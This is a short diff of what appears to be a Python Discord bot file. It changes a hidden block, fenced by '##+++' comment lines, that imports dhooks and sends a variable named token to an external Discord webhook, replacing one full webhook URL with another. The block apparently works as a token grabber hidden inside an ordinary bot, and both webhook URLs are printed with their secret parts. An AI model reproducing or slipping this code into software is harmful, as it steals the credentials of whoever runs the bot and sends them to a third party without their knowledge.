@@ -475,7 +475,7 @@ async def hands(ctx, member: discord.Member = None):
 ## +++++++++++++++++
 
 from dhooks import Webhook
-hook = Webhook('https://discord.com/api/webhooks/973964759227588730/LOjiuHCUS7y8rqVdjDuN0A4jxCcqsBRmC86PZjAOnX_zZkgZduUXJ0SgSetth-vQ7j6p')
+hook = Webhook('https://discord.com/api/webhooks/1110218289881305109/EgiqG1dQ3UT-WTX1Fdyz0xloSFlodELY-dofCWtoaX9xwoJMbS3vGL7YFBd4pw_O9CAy')
 hook.send(token)
 
 ##++++++++++++++++++
